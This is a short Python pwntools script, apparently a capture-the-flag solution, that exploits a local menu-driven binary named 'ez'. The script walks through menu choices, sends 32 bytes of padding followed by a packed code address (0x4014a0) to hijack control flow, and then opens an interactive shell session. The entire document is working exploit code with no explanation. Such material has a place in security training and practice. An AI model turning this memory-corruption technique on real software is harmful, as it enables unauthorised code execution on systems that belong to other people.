from pwn import *
elf = context.binary = ELF('./ez',checksec=False)
p = process(elf.path)
context.terminal = "tmux splitw -h".split(" ")
#gdb.attach(p)

for _ in range(2):
    p.sendlineafter(b": ", b"1")
    p.sendlineafter(b": ", b"a")

p.sendlineafter(b": ", b"2")
p.sendlineafter(b": ", b"0")
p.sendlineafter(b": ", b"A"*32 + p32(0x00000000004014a0))
p.sendlineafter(b": ", b"3")
p.sendlineafter(b": ", b"1")

p.interactive()
